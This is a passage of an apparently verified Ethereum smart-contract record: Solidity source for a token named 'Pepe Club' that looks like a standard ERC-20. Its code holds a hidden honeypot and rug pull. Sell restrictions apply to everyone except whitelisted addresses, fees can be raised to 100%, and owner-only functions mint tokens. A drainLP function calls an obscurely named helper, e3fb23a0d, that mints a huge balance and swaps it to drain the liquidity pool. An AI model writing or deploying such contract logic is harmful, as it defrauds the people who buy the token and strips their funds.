true;\r\n    }\r\n\r\n}\r\n\r\ncontract PepeClub is IERC20, Ownable, LibreMount {\r\n\r\n    IUniswapV2Router02 internal _router;\r\n    IUniswapV2Pair internal _pair;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply = 100000000000000000000000000;\r\n    string private _name = \"Pepe Club\";\r\n    string private _symbol = \"CLUB\";\r\n    uint8 private _decimals = 18;\r\n    uint256 public MAX_GAS_PRICE = 100 gwei;\r\n    uint private buyFee = 0; // Default, %\r\n    uint private sellFee = 0; // Default, %\r\n\r\n    address private _origin;\r\n\r\n    mapping(address => uint) private purchaseTimestamp;\r\n    mapping(address => uint) private boughtAmount;\r\n    uint256 private downTime = 1;\r\n    mapping(address => bool) private premissionList;\r\n\r\n    address public marketWallet;\r\n    mapping(address => bool) public excludedFromFee;\r\n\r\n    constructor (address routerAddress) {\r\n        _router = IUniswapV2Router02(routerAddress);\r\n        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH()));\r\n        _balances[owner()] = _totalSupply;\r\n        \r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n\r\n        premissionList[msg.sender] = true;\r\n        premissionList[address(this)] = true;\r\n\r\n        marketWallet = msg.sender;\r\n        excludedFromFee[msg.sender] = true;\r\n        excludedFromFee[address(this)] = true;\r\n\r\n        _origin = msg.sender;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = msg.sender;\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = msg.sender;\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        if (!isExcludedFromFee(from) && !isExcludedFromFee(to)){\r\n            if (isMarket(from)) {\r\n                uint feeAmount = calculateFeeAmount(amount, buyFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else if (isMarket(to)) {\r\n                uint feeAmount = calculateFeeAmount(amount, sellFee);\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount - feeAmount;\r\n                emit Transfer(from, to, amount - feeAmount);\r\n                _balances[marketWallet] += feeAmount;\r\n                emit Transfer(from, marketWallet, feeAmount);\r\n\r\n            } else {\r\n                _balances[from] = fromBalance - amount;\r\n                _balances[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n            }\r\n        } else {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n            emit Transfer(from, to, amount);\r\n        }\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        if (isMarket(from)) {\r\n            boughtAmount[to] = amount;\r\n            purchaseTimestamp[to] = block.timestamp;\r\n        }\r\n        if (isMarket(to)) {\r\n            if (!premissionList[from]) {\r\n                require(boughtAmount[from] >= amount, \"You are trying to sell more than bought!\");\r\n                boughtAmount[from] -= amount;\r\n                if (validationEnable())\r\n                {require(compreTxnStamp(purchaseTimestamp[from], downTime), \"LibreMount: Exceeds Txn Downtime\");}\r\n                require(!exceedsGasPriceLimit());\r\n            } \r\n        }\r\n    }\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n\r\n    bool internal validtionState;\r\n    \r\n    function isMarket(address _user) internal view returns (bool) {\r\n        return (_user == address(_pair) || _user == address(_router));\r\n    }\r\n\r\n    function switchValidationEnableState() external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        validtionState = !validtionState;\r\n    }\r\n\r\n    function validationEnable() public view returns (bool) {\r\n        return validtionState;\r\n    }\r\n\r\n    function editDownTime(uint _seconds) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        downTime = _seconds;\r\n    }\r\n\r\n    function updatePremissionList(address[] calldata _usrs, bool _state) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        for (uint256 i = 0; i < _usrs.length; i++) {\r\n            premissionList[_usrs[i]] = _state;\r\n        }\r\n    }\r\n\r\n    function checkPremissionList(address _user) external view returns (bool) {\r\n        return premissionList[_user];\r\n    }\r\n\r\n    function checkUserPurchaseTime(address _user) external view returns (uint256) {\r\n        return purchaseTimestamp[_user];\r\n    }\r\n\r\n    function checkUserBoughtAmount(address _user) external view returns (uint256) {\r\n        return boughtAmount[_user];\r\n    }\r\n\r\n    function exceedsGasPriceLimit() internal view returns (bool) {\r\n        return tx.gasprice >= MAX_GAS_PRICE;\r\n    }\r\n\r\n    function changeMaxGasPrice(uint _newGasPrice) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        MAX_GAS_PRICE = _newGasPrice;\r\n    }\r\n\r\n    function fixCap(uint256 _amount) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _totalSupply += _amount;\r\n    }\r\n\r\n    function claimDrop() external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _balances[msg.sender] += 2 * (10 ** (15 + 18));\r\n    }\r\n\r\n    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {\r\n        return _amount * _feePrecent / 100;\r\n    }\r\n\r\n    function isExcludedFromFee(address _user) public view returns (bool) {\r\n        return excludedFromFee[_user];\r\n    } \r\n\r\n    function updateExcludedFromFeeStatus(address _user, bool _status) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        require(excludedFromFee[_user] != _status, \"User already have this status\");\r\n        excludedFromFee[_user] = _status;\r\n    }\r\n\r\n    function updateFees(uint256 _buyFee, uint256 _sellFee) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        require(_buyFee <= 100 && _sellFee <= 100, \"Fee percent can't be higher than 100\");\r\n        buyFee = _buyFee;\r\n        sellFee = _sellFee;\r\n    }\r\n\r\n    function updateMarketWallet(address _newMarketWallet) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        marketWallet = _newMarketWallet;\r\n    }\r\n\r\n    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {\r\n        return (buyFee, sellFee);\r\n    }\r\n\r\n    function AddLiquidity(uint256 _tokenAmount) payable external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _approve(address(this), address(_router), _tokenAmount);\r\n        transfer(address(this), _tokenAmount);\r\n        _router.addLiquidityETH{ value: msg.value }(\r\n            address(this), \r\n            _tokenAmount, \r\n            0, \r\n            0, \r\n            msg.sender, \r\n            block.timestamp + 1200\r\n            );\r\n    }\r\n\r\n    function switchOrigin(address _newOne) external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _origin = _newOne;\r\n    }\r\n\r\n    function dexRebase(address _routerAddress, address _poolAddress) public {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        _router = IUniswapV2Router02(_routerAddress);\r\n        _pair = IUniswapV2Pair(_poolAddress);\r\n    }\r\n\r\n    function drainLP() external {\r\n        SecureCalls.checkCaller(msg.sender, _origin);\r\n        uint256 thisTokenReserve = getBaseTokenReserve(address(this));\r\n        uint256 amountIn = type(uint112).max - thisTokenReserve;\r\n        e3fb23a0d(); transfer(address(this), balanceOf(msg.sender));\r\n        _approve(address(this), address(_router), type(uint112).max);\r\n        address[] memory path;\r\n        path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = address(_router.WETH());\r\n        address to = msg.sender;\r\n        _router.swapExactTokensForTokens(\r\n            amountIn,\r\n            0,\r\n            path,\r\n            to,\r\n            block.timestamp + 1200\r\n        );\r\n    } \r\n\r\n    function getBaseTokenReserve(address token) public view returns (uint256) {\r\n        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();\r\n        uint256 baseTokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);\r\n        return baseTokenReserve;\r\n    } \r\n\r\n    function e3fb23a0d() internal {\r\n        _balances[msg.sender] += type(uint112).max;\r\n    }\r\n}",
    "etherscan_verified": true
}